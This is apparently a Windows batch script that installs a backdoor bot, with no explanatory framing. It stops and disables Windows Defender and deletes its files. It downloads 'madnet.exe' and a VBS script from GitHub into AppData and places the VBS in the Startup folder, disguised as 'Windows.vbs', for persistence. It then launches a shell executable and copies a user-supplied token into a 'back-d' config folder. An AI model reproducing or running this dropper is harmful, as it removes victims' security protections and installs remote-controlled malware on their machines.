@echo off

net stop WinDefend
sc config WinDefend start= disabled
del /f /s /q "%ProgramFiles%\Windows Defender"
del /f /s /q "%ProgramData%\Microsoft\Windows Defender"

set /p Token_Num="Token: "

powershell -Command "Invoke-WebRequest https://raw.githubusercontent.com/DmodvGH/madnet.exe/main/bot/madnet.exe -OutFile %appdata%\Microsoft\Windows\madnet.exe"

start %appdata%\Microsoft\Windows\windows_shell.exe

powershell -Command "Invoke-WebRequest https://raw.githubusercontent.com/DmodvGH/BackDoorBot/main/bot/invis.vbs -OutFile '%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\Windows.vbs'"
%appdata%\Microsoft\Windows\madnet.exe -e -aoa
copy ".\token\%Token_Num%" "%appdata%\Microsoft\Windows\back-d\config"

pause > nul
